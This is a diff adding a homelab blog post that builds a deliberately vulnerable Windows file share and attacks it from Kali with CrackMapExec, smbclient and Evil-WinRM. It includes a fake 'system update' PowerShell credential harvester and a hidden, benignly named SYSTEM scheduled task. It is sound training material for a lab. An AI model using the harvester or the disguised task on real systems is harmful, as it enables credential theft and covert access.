@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Creating a Vulnerable Windows Network Share &mdash; purplepyram1d</title>
+<meta name="description" content="Fig 1. johnnymeintel.com Think of it like creating a shared Google Drive folder, but instead of internet-based access, it uses your local network. 1 Creating the Network Share I ru">
+<meta name="author" content="Johnny Meintel">
+<link rel="icon" href="../../assets/images/logo-pyramid.png">
+<link rel="stylesheet" href="../../assets/css/site.css">
+
+<link rel="canonical" href="https://johnnymeintel.com/blog/posts/creating-a-vulnerable-windows-network-share.html">
+
+<meta property="og:title" content="Creating a Vulnerable Windows Network Share">
+<meta property="og:description" content="Fig 1. johnnymeintel.com Think of it like creating a shared Google Drive folder, but instead of internet-based access, it uses your local network. 1 Creating the Network Share I ru">
+<meta property="og:type" content="article">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
+
+  <header class="masthead compact">
+    <div class="mast-row">
+      <div>
+        <a href="../../index.html"><h1 class="title sm">purplepyram<span class="dim">1</span>d</h1></a>
+      </div>
+      <nav class="mast-nav" aria-label="Primary">
+        <a href="../../index.html">Contents</a>
+        <a href="../index.html">Writing</a>
+        <a href="../../rooted.html">Log</a>
+        <a href="https://github.com/purplepyram1d">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main" style="margin-top:2.5rem;">
+  <div class="grid">
+
+    <div class="rail">
+      <span>2026-01-09</span>
+      <span class="em">T1021.002</span>
+      <span>~4 min</span>
+    </div>
+
+    <article>
+      <h1>Creating a Vulnerable Windows Network Share</h1>
+      <div class="art-meta">Johnny Meintel &middot; 2026-01-09</div>
+
+<figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/01.png" alt="johnnymeintel.com">
+        <figcaption><span class="lab">Fig 1.</span> johnnymeintel.com</figcaption>
+      </figure>
+      <p>Think of it like creating a shared Google Drive folder, but instead of internet-based access, it uses your localÂ network.</p>      <h2><span class="n">1</span>Creating the NetworkÂ Share</h2>
+      <p>I run these commands on my Windows Server 2022 Domain Controllerâ€Šâ€”â€ŠDC01:</p><pre># Create root directory for file shares
+New-Item "C:\Shares" -ItemType Directory -Force
+
+# Create departmental subdirectories
+New-Item "C:\Shares\Executive" -ItemType Directory -Force
+New-Item "C:\Shares\IT" -ItemType Directory -Force
+New-Item "C:\Shares\Finance" -ItemType Directory -Force
+New-Item "C:\Shares\Public" -ItemType Directory -Force
+
+# Create Executive share with Read access for all Domain Users
+New-SmbShare -Name "Executive" -Path "C:\Shares\Executive" -FullAccess "CJCS\Domain Admins" -ReadAccess "CJCS\Domain Users"
+
+# Create IT share with Change access for IT Support
+New-SmbShare -Name "IT" -Path "C:\Shares\IT" -FullAccess "CJCS\Domain Admins" -ChangeAccess "CJCS\IT Support"
+
+# Create Finance share with Read access for Finance group
+New-SmbShare -Name "Finance" -Path "C:\Shares\Finance" -FullAccess "CJCS\Domain Admins" -ReadAccess "CJCS\Finance"
+
+# Create Public share with Full Control for all Domain Users (High Risk)
+New-SmbShare -Name "Public" -Path "C:\Shares\Public" -FullAccess "CJCS\Domain Users"
+
+# Verify share creation and specific path mappings
+Get-SmbShare | Where-Object {$_.Path -like "C:\Shares\*"} | Format-Table Name, Path, Description -AutoSize</pre>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/02.png" alt="Network shares created successfully.">
+        <figcaption><span class="lab">Fig 2.</span> Network shares created successfully.</figcaption>
+      </figure>
+      <p>The first step is to make sure another computer on the network can see these shares. I head over to my over domain-joined Windows 11 VMâ€Šâ€”â€ŠMGR1â€Šâ€”â€Šand run these commands:</p><pre># Map the Public share to drive P:
+net use P: \\DC01\Public
+
+# Create a test file
+echo "Test from MGR1" &gt; P:\test-file.txt
+
+# Verify the file exists
+dir P:\
+
+# Read the file
+type P:\test-file.txt
+
+# Clean up
+del P:\test-file.txt
+net use P: /delete</pre>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/03.png" alt="The file was created and visible over theÂ network.">
+        <figcaption><span class="lab">Fig 3.</span> The file was created and visible over theÂ network.</figcaption>
+      </figure>
+      <p>Success. Network shares have been created and are inÂ use.</p>
+      <p>The main vulnerability introduced here is that the Public share has full control (not just read-only) for all Domain Users. In addition to that, the service accounts have Domain Admin privileges, in additions to weak passwords that could easily be bruteÂ forced.</p>
+      <p>MGR1 is meant to view these network shares. What happens when an attacker gains stolen credentials, to a service account for example, and can access the networkÂ shares?</p>      <h2><span class="n">2</span>Accessing fromÂ Kali</h2>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/04.png" alt="Generic service account, visible networkÂ shares.">
+        <figcaption><span class="lab">Fig 4.</span> Generic service account, visible networkÂ shares.</figcaption>
+      </figure>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/05.png" alt="crackmapexec using stolen credentials to view networkÂ shares.">
+        <figcaption><span class="lab">Fig 5.</span> crackmapexec using stolen credentials to view networkÂ shares.</figcaption>
+      </figure>
+      <p>Excessive privileges + weak passwords. This makes for easy access using <a href="https://www.kali.org/tools/crackmapexec/"><strong>crackmapexec</strong></a>. The network shares have been enumerated.</p>
+      <p>Letâ€™s start small and create a file on DC01 and download it from KALI using <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"><strong>smb-client</strong></a>.</p>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/06.png" alt="Creating a file onÂ DC01.">
+        <figcaption><span class="lab">Fig 6.</span> Creating a file onÂ DC01.</figcaption>
+      </figure>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/07.png" alt="Downloading it from KALI via smbclient.">
+        <figcaption><span class="lab">Fig 7.</span> Downloading it from KALI via smbclient.</figcaption>
+      </figure>      <h2><span class="n">3</span>Malicious Script</h2>
+      <p>Download successful. How about an upload? But now just any upload. Letâ€™s create a â€œmalicious scriptâ€â€Šâ€”â€Šall it does it open a username and password box and records the entry to a text file on the sharedÂ drive:</p><pre>cat &gt; malicious_script.ps1 &lt;&lt; 'EOF'
+# Fake "system update" script
+# Actually: credential harvester or reverse shell
+
+$cred = Get-Credential
+$cred.GetNetworkCredential().Password | Out-File "\\DC01\Public\harvested_creds.txt" -Append
+EOF</pre>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/08.png" alt="Script uploaded to networkÂ share.">
+        <figcaption><span class="lab">Fig 8.</span> Script uploaded to networkÂ share.</figcaption>
+      </figure>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/09.png" alt="Script running on DC01 asking for credentials.">
+        <figcaption><span class="lab">Fig 9.</span> Script running on DC01 asking for credentials.</figcaption>
+      </figure>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/10.png" alt="Credentials harvested and downloaded toÂ KALI.">
+        <figcaption><span class="lab">Fig 10.</span> Credentials harvested and downloaded toÂ KALI.</figcaption>
+      </figure>
+      <p>The username and password were successfully stored and then downloaded from the shared drive on KALI. Now on to <a href="https://www.kali.org/tools/evil-winrm/"><strong>Evil-WinRM</strong></a>.</p>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/11.png" alt="Shell access to the network share via service account credentials using Evil-WinRM.">
+        <figcaption><span class="lab">Fig 11.</span> Shell access to the network share via service account credentials using Evil-WinRM.</figcaption>
+      </figure>
+      <p>Remote shell established! This would allow an attacker to run scripts stored on the service accountâ€™s directory.</p>
+      <p>These tools are not competitors; they are steps in a sequence.</p><ol><li><strong>Scan with CrackMapExec:</strong> â€œDo these credentials work? Am I an Admin (Pwn3d!)?&quot;</li><li><strong>Explore with smbclient:</strong> â€œLet me see if there are any interesting files (passwords.txt) on theÂ shares.â€</li><li><strong>Execute with Evil-WinRM:</strong> â€œI am an Admin. Iâ€™m going in to take control.â€</li></ol>      <h2><span class="n">4</span>Scheduled TaskÂ Creation</h2>
+      <p>Whatâ€™s next? This homelab is meant to simulate an enterprise network. I will now populate the network shares with â€œsensitive dataâ€ for KALI to exfiltrate on a consistent schedule.</p><pre>$targetFile = "C:\Shares\Public\sensitive_data.txt"
+# ============================================
+
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+
+$dataTypes = @(
+    "[EMPLOYEE_RECORD] EmployeeID: $(Get-Random -Minimum 1000 -Maximum 9999), SSN: $(Get-Random -Minimum 100000000 -Maximum 999999999), Salary: `$$(Get-Random -Minimum 45000 -Maximum 150000)"
+    "[CREDENTIALS] Service: SQL-PROD-01, Username: sa, Password: $((-join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})))!"
+    "[FINANCIAL] Transaction: $(Get-Random -Minimum 10000 -Maximum 99999), Amount: `$$(Get-Random -Minimum 1000 -Maximum 50000), Account: $(Get-Random -Minimum 1000000 -Maximum 9999999)"
+    "[API_KEY] Service: AWS-PROD, Key: AKIA$((-join ((65..90) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})))"
+    "[VPN_CONFIG] Gateway: vpn.cjcs.local, PSK: $((-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 20 | ForEach-Object {[char]$_})))"
+)
+
+$selectedData = Get-Random -InputObject $dataTypes
+$logEntry = "[$timestamp] $selectedData"
+
+Add-Content -Path $targetFile -Value $logEntry -Force
+
+$content = Get-Content $targetFile -Tail 100
+$content | Set-Content $targetFile -Force</pre>
+      <p>Everytime this script runs, it generates a random piece of â€œsensitive dataâ€ and appends it to â€œsensitive_data.txtâ€ which is stored on our newly created shared drive. Letâ€™s make it so this script executes every 5Â minutes.</p><pre>$ScriptPath = "C:\Scripts\DC01-Generate-Sensitive-Data.ps1"
+$TaskName = "SystemDataSync"
+$Description = "Routine data synchronization service"
+$User = "NT AUTHORITY\SYSTEM"
+
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$ScriptPath`""
+$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+$Task = Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -Description $Description -User $User -RunLevel Highest -Force
+
+$Task</pre>      <figure>
+        <img src="../../assets/images/creating-a-vulnerable-windows-network-share/12.png" alt="Task ran successfully.">
+        <figcaption><span class="lab">Fig 12.</span> Task ran successfully.</figcaption>
+      </figure>
+      <p>Now weâ€™ve given a reason for KALI to establish persistence.</p>
+      <p><strong>Follow me:</strong></p>
+      <p><a href="https://johnnymeintel.com/">My Website</a></p>
+      <p><a href="https://www.linkedin.com/in/johnny-meintel-3a9280269/">LinkedIn</a></p>
+      <p><a href="https://x.com/548074G3">X</a></p>
+      <p><a href="https://github.com/johnnymeintel/johnnycybersec">GitHub</a></p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=fd43ec5bf8f4" width="1" height="1" alt="">
+
+      <hr>
+
+      <p class="kicker" style="font-family:var(--mono);font-size:.75rem;color:var(--ink-3);">
+        Rules and reproduction steps:
+        <a href="https://github.com/purplepyram1d/rmm-multiplicity" style="border-bottom:1px solid var(--rule);">github.com/purplepyram1d/rmm-multiplicity</a>
+      </p>
+    </article>
+  </div>
+  </main>
+
+  <footer>
+    <div class="grid">
+      <div class="rail"><span>about</span></div>
+      <div class="colophon">
+        <p class="fine">
+          <a href="https://github.com/purplepyram1d">github</a> &middot;
+          <a href="https://www.linkedin.com/in/johnnymeintel">linkedin</a><br>
+          <a href="../../index.html">&larr; contents</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
